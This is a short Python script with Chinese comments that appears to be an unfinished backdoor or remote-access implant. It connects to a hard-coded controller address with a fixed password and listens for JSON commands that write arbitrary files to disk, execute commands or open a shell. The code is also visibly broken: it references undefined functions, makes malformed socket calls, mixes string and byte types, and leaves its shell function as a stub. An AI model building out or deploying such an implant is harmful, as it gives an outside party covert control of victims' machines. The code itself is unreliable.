# 小可怜
import json
import socket
import threading
Master_ip = "192.168.1.1"
Master_port = 12345
Passport = 1234

Master_choose = {
    'upload':upload,
    'execute':execute_command,
    'shell':open_shell
}


def connect_master():
    """连接目标机器，且进行初始化操作,获得socket

    """
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        server.connect(Master_ip,Master_port)
        #对密码
        server.send(Passport)
        
    except Exception as e:
        print("[*] Exception ! Exiting.")
        print(e)

def listen_master(ip = "0.0.0.0",port = 12345):
    """开启监听模式

    Args:
        ip (str, optional): 控制端ip. Defaults to "0.0.0.0".
        port (int, optional): 对应端口. Defaults to 12345.
    """
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((ip,port))
    server.listen(5)
    
    while True:
        master_socket,addr = server.accept()
        client_thread = threading.Thread(target=handler,args=(master_socket,))
        client_thread.start()
        

def handler(master_socket):
    """服务端处理

    Args:
        master_socket (_type_): socket
    """
    buffer = ""
    # 持续接收数据
    while True:
        msg = master_socket.recv(1024)
        if not msg:
            break
        else:
            buffer += msg
    buffer = buffer.decode()
    buffer = buffer.replace('\'','\"')
    data = json.loads(buffer)
    
    print(data)
    
    master_code = data[0]
    
    output = Master_choose[master_code](data[1])
    if output:
        master_socket.send(f"[ * ]Complete master task. Type {master_code} From ip {socket.gethostname}".encode())
    else:
        master_socket.send(f"[ !!! ]Failed task!!. Type {master_code} From ip {socket.gethostname}".encode())
    
    

def upload(msg):
    """上传文件
    Args:
        msg (list): 目标路径和文件数据组成的列表
    """
    dst_path = msg[0]
    file_data  = msg[1]
    
    if(len(dst_path)):
            try:
                with open(dst_path,'wb') as f:
                    f.write(file_data)
                    f.close()
                #self.socket.send(file_buffer)
                return True
                    
            except Exception as e:
                print('read exception')

def open_shell():
    pass